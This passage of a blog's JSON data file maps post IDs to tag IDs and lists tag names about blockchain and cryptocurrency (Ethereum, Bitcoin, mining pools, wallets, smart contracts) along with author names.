e1b16kmt","tag_id":"cjf7piavf000qpkwocny58zyc","_id":"cjf7piavu001cpkwonb0q9xsh"},{"post_id":"cjf7piaus0001pkwoe1b16kmt","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piavw001fpkwoaq9q1ybr"},{"post_id":"cjf7piaux0004pkwojm85qmx8","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piavy001jpkwonvnliufm"},{"post_id":"cjf7piaux0004pkwojm85qmx8","tag_id":"cjf7piavf000qpkwocny58zyc","_id":"cjf7piaw0001mpkwoyx9s5wqb"},{"post_id":"cjf7piavv001dpkwof5qoe26u","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piaw2001qpkwotzgrn0n8"},{"post_id":"cjf7piavv001dpkwof5qoe26u","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piaw4001tpkwoop9qemke"},{"post_id":"cjf7piavv001dpkwof5qoe26u","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piaw6001xpkwoj8ua12pb"},{"post_id":"cjf7piavx001hpkwotkedf3bu","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piaw80020pkwoxer6p0jh"},{"post_id":"cjf7piavx001hpkwotkedf3bu","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piaw90024pkwoxdixqa7k"},{"post_id":"cjf7piavx001hpkwotkedf3bu","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piawb0027pkwoeptpnr3t"},{"post_id":"cjf7piauz0005pkwo5ocr6mom","tag_id":"cjf7piavx001gpkwobk82mvg2","_id":"cjf7piawc002bpkwoz2ho0k8r"},{"post_id":"cjf7piauz0005pkwo5ocr6mom","tag_id":"cjf7piaw1001npkwo1y7mabno","_id":"cjf7piawe002epkwoimeoyo7d"},{"post_id":"cjf7piawa0025pkwog3vvefje","tag_id":"cjf7piavx001gpkwobk82mvg2","_id":"cjf7piawg002ipkwoz82gfmih"},{"post_id":"cjf7piawa0025pkwog3vvefje","tag_id":"cjf7piaw1001npkwo1y7mabno","_id":"cjf7piawh002kpkwocvfixs8t"},{"post_id":"cjf7piav00006pkwo172gvylx","tag_id":"cjf7piavx001gpkwobk82mvg2","_id":"cjf7piawh002mpkwo4ff4nq3x"},{"post_id":"cjf7piav00006pkwo172gvylx","tag_id":"cjf7piaw1001npkwo1y7mabno","_id":"cjf7piawi002ppkwo4hcjhbb8"},{"post_id":"cjf7piav20009pkwo5ropiacu","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piawi002rpkwor2orx4tw"},{"post_id":"cjf7piav20009pkwo5ropiacu","tag_id":"cjf7piawc002apkworwlq8plh","_id":"cjf7piawj002upkwo0jihzk97"},{"post_id":"cjf7piav20009pkwo5ropiacu","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piawj002wpkwoilc146e3"},{"post_id":"cjf7piav4000apkworz2aw7jj","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piawk002zpkwonhbljq9s"},{"post_id":"cjf7piav4000apkworz2aw7jj","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piawk0030pkworzunyopk"},{"post_id":"cjf7piav4000apkworz2aw7jj","tag_id":"cjf7piawc002apkworwlq8plh","_id":"cjf7piawk0032pkwon2zi727z"},{"post_id":"cjf7piav6000epkworyqsrfdo","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piawl0035pkwonqcu0tmr"},{"post_id":"cjf7piav6000epkworyqsrfdo","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawl0036pkwolk6vn5ci"},{"post_id":"cjf7piav6000epkworyqsrfdo","tag_id":"cjf7piawk0031pkwob770khp8","_id":"cjf7piawm0038pkwor4l3w4ol"},{"post_id":"cjf7piav6000epkworyqsrfdo","tag_id":"cjf7piawl0033pkwo8yvk4g2a","_id":"cjf7piawm0039pkwoc8kt3v34"},{"post_id":"cjf7piav9000gpkwoxao9iu31","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawm003bpkwor3s5ycov"},{"post_id":"cjf7piav9000gpkwoxao9iu31","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piawm003cpkwomo9scm29"},{"post_id":"cjf7piav9000gpkwoxao9iu31","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawn003epkwo9xogco09"},{"post_id":"cjf7piavc000lpkwo7ryicz85","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawn003fpkwo941f9x7n"},{"post_id":"cjf7piavc000lpkwo7ryicz85","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawo003hpkwodr5fdrsw"},{"post_id":"cjf7piavc000lpkwo7ryicz85","tag_id":"cjf7piawm003apkwo2c8lx05x","_id":"cjf7piawo003ipkwohqeei0sw"},{"post_id":"cjf7piavd000npkwo3peccxbr","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawo003kpkwo0tw81r5a"},{"post_id":"cjf7piavd000npkwo3peccxbr","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piawp003lpkwo168j6yy5"},{"post_id":"cjf7piavd000npkwo3peccxbr","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawp003npkwoqw09v7hn"},{"post_id":"cjf7piavd000npkwo3peccxbr","tag_id":"cjf7piawm003apkwo2c8lx05x","_id":"cjf7piawp003opkwoq501gbtb"},{"post_id":"cjf7piavf000rpkwohf41z4og","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawq003qpkwogyvxvm85"},{"post_id":"cjf7piavf000rpkwohf41z4og","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piawq003rpkwohr3t2tq7"},{"post_id":"cjf7piavf000rpkwohf41z4og","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawq003tpkwonakiwhqe"},{"post_id":"cjf7piavj000tpkwof18s3uag","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piawr003upkwoj7idcruq"},{"post_id":"cjf7piavj000tpkwof18s3uag","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawr003wpkwo96guq2cn"},{"post_id":"cjf7piavj000tpkwof18s3uag","tag_id":"cjf7piawp003ppkwoydv7isk9","_id":"cjf7piawr003xpkwo23wrop8l"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawt0041pkwoiw4zcnop"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piawt0042pkwodsat375t"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawt0044pkwoxtiyo5ah"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piawr003vpkwolskgjpn2","_id":"cjf7piawu0045pkwokt4skrwp"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piawr003ypkwo7n2kgeu9","_id":"cjf7piawu0047pkwofret2sy9"},{"post_id":"cjf7piavk000vpkwo7l7huqtj","tag_id":"cjf7piaws003zpkwonpud1b0r","_id":"cjf7piawu0048pkwoiflgon3d"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piawv004cpkwovvbd1gyc"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piawv004dpkwoigwrsjlh"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piawt0043pkwoxrk1qg4j","_id":"cjf7piaww004fpkwo1kgavpce"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piawu0046pkwolgv6fyvx","_id":"cjf7piaww004gpkwovxgluzyj"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piawu0049pkwovzsdkd2a","_id":"cjf7piaww004ipkwom96px40c"},{"post_id":"cjf7piavm000ypkwom8df87ov","tag_id":"cjf7piawu004apkwo31bfr0pr","_id":"cjf7piawx004jpkwoz4z9qcf8"},{"post_id":"cjf7piavn0010pkwogiujtx35","tag_id":"cjf7piavx001gpkwobk82mvg2","_id":"cjf7piawx004lpkwobyy0pdkv"},{"post_id":"cjf7piavn0010pkwogiujtx35","tag_id":"cjf7piaw1001npkwo1y7mabno","_id":"cjf7piawx004mpkwosl2t4ei1"},{"post_id":"cjf7piavp0013pkwoy0wj1l2h","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piawy004opkwowg5o4amo"},{"post_id":"cjf7piavp0013pkwoy0wj1l2h","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piawy004ppkwo08gzrftc"},{"post_id":"cjf7piavp0013pkwoy0wj1l2h","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piawz004rpkwo8b375up9"},{"post_id":"cjf7piavp0013pkwoy0wj1l2h","tag_id":"cjf7piaww004hpkwof7ut45yx","_id":"cjf7piawz004spkwol9be35of"},{"post_id":"cjf7piavr0016pkwotjxlvs56","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piax0004upkwoi585hgk4"},{"post_id":"cjf7piavr0016pkwotjxlvs56","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piax0004vpkwoh73njvvx"},{"post_id":"cjf7piavr0016pkwotjxlvs56","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piax0004xpkwoes193zch"},{"post_id":"cjf7piavr0016pkwotjxlvs56","tag_id":"cjf7piaww004hpkwof7ut45yx","_id":"cjf7piax0004ypkwoyov5qhyp"},{"post_id":"cjf7piavt001apkwo7vmq7dpu","tag_id":"cjf7piav6000dpkwosdvaz1n4","_id":"cjf7piax10050pkwo76jrj1vh"},{"post_id":"cjf7piavt001apkwo7vmq7dpu","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piax10051pkwovrw4pex6"},{"post_id":"cjf7piavt001apkwo7vmq7dpu","tag_id":"cjf7piavl000xpkwoerbyc3sx","_id":"cjf7piax20053pkwova4nukfq"},{"post_id":"cjf7piavt001apkwo7vmq7dpu","tag_id":"cjf7piaww004hpkwof7ut45yx","_id":"cjf7piax20054pkwo4nfv4gk2"},{"post_id":"cjf7piavz001kpkwom15ghi37","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax20056pkwof5ynjsus"},{"post_id":"cjf7piavz001kpkwom15ghi37","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piax30057pkwollein8kr"},{"post_id":"cjf7piavz001kpkwom15ghi37","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piax30059pkwobpe2stna"},{"post_id":"cjf7piaw1001opkwop3p3p6po","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax3005apkwopnosigh6"},{"post_id":"cjf7piaw1001opkwop3p3p6po","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piax3005bpkwo9mjfrc2g"},{"post_id":"cjf7piaw1001opkwop3p3p6po","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piax4005dpkwopql37jt9"},{"post_id":"cjf7piaw3001rpkwok0927on5","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax4005epkwox3gysbvz"},{"post_id":"cjf7piaw3001rpkwok0927on5","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piax5005gpkwo3ju55yla"},{"post_id":"cjf7piaw3001rpkwok0927on5","tag_id":"cjf7piax20055pkwooulkrc3i","_id":"cjf7piax5005hpkwobi410mn8"},{"post_id":"cjf7piaw5001upkwoowhrv02x","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax5005jpkwo20b5jgws"},{"post_id":"cjf7piaw5001upkwoowhrv02x","tag_id":"cjf7piax30058pkwo8mf0fxxa","_id":"cjf7piax6005kpkwo8metnyb8"},{"post_id":"cjf7piaw5001upkwoowhrv02x","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piax6005mpkwovkd2bhk9"},{"post_id":"cjf7piaw7001ypkwomgwbm7wf","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax6005npkwozlyamlf7"},{"post_id":"cjf7piaw7001ypkwomgwbm7wf","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piax8005ppkwoge3ta1b9"},{"post_id":"cjf7piaw7001ypkwomgwbm7wf","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piax8005qpkwosmpbvkyc"},{"post_id":"cjf7piaw80021pkwo2nstrogm","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piax9005spkworj0yr1rl"},{"post_id":"cjf7piaw80021pkwo2nstrogm","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piax9005tpkwoe7kyt1i5"},{"post_id":"cjf7piawb0028pkwoac2uzepf","tag_id":"cjf7piavp0012pkwocbhdn1kp","_id":"cjf7piaxa005vpkwo6k97ou7v"},{"post_id":"cjf7piawb0028pkwoac2uzepf","tag_id":"cjf7piawy004qpkwo6san645x","_id":"cjf7piaxa005wpkwovj3irhmd"},{"post_id":"cjf7piawb0028pkwoac2uzepf","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piaxb005ypkwo6gw28i8s"},{"post_id":"cjf7piawd002cpkwovy527fv4","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piaxc0060pkwo7fc8w4nv"},{"post_id":"cjf7piawd002cpkwovy527fv4","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piaxc0061pkwo4ceihf3t"},{"post_id":"cjf7piawd002cpkwovy527fv4","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piaxc0063pkwokw621x7a"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piaux0003pkwo3x3kpn4v","_id":"cjf7piaxe0066pkwozyjm5j6l"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piawf002hpkwogl9zaywn","_id":"cjf7piaxe0067pkwoka6cw4bo"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piawl0034pkwo9yts2esn","_id":"cjf7piaxe0068pkwo0u706l99"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piavb000kpkwogkj8empi","_id":"cjf7piaxe0069pkwo4vvp3acw"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piaxc0064pkwogv1d5hag","_id":"cjf7piaxe006apkwoqthanht8"},{"post_id":"cjf7piawe002fpkwoz8r35s54","tag_id":"cjf7piaxd0065pkwoqueihe7c","_id":"cjf7piaxe006bpkwoh4pwvzdj"}],"Tag":[{"name":"lucas556","_id":"cjf7piaux0003pkwo3x3kpn4v"},{"name":"矿机","_id":"cjf7piav20008pkwo4gkzf61s"},{"name":"ZhouFyk","_id":"cjf7piav6000dpkwosdvaz1n4"},{"name":"以太坊","_id":"cjf7piavb000kpkwogkj8empi"},{"name":"EOS","_id":"cjf7piavf000qpkwocny58zyc"},{"name":"智能合约","_id":"cjf7piavl000xpkwoerbyc3sx"},{"name":"LeonBCK","_id":"cjf7piavp0012pkwocbhdn1kp"},{"name":"ciscolxh","_id":"cjf7piavx001gpkwobk82mvg2"},{"name":"钱包","_id":"cjf7piaw1001npkwo1y7mabno"},{"name":"zcash","_id":"cjf7piawc002apkworwlq8plh"},{"name":"矿池","_id":"cjf7piawf002hpkwogl9zaywn"},{"name":"POS","_id":"cjf7piawk0031pkwob770khp8"},{"name":"Casper","_id":"cjf7piawl0033pkwo8yvk4g2a"},{"name":"区块链","_id":"cjf7piawl0034pkwo9yts2esn"},{"name":"ethereum","_id":"cjf7piawm003apkwo2c8lx05x"},{"name":"全网难度","_id":"cjf7piawp003ppkwoydv7isk9"},{"name":"燃料","_id":"cjf7piawr003vpkwolskgjpn2"},{"name":"gas","_id":"cjf7piawr003ypkwo7n2kgeu9"},{"name":"翻译","_id":"cjf7piaws003zpkwonpud1b0r"},{"name":"门罗币","_id":"cjf7piawt0043pkwoxrk1qg4j"},{"name":"CoffeeMiner","_id":"cjf7piawu0046pkwolgv6fyvx"},{"name":"MITM","_id":"cjf7piawu0049pkwovzsdkd2a"},{"name":"CoinHive","_id":"cjf7piawu004apkwo31bfr0pr"},{"name":"安全开发","_id":"cjf7piaww004hpkwof7ut45yx"},{"name":"比特币","_id":"cjf7piawy004qpkwo6san645x"},{"name":"交易池","_id":"cjf7piax20055pkwooulkrc3i"},{"name":"bitcoin","_id":"cjf7piax30058pkwo8mf0fxxa"},{"name":"私有链","_id":"cjf7piaxc0064pkwogv1d5hag"},{"name":"挖矿","_id":"cjf7piaxd0065pkwoqueihe7c"}]}}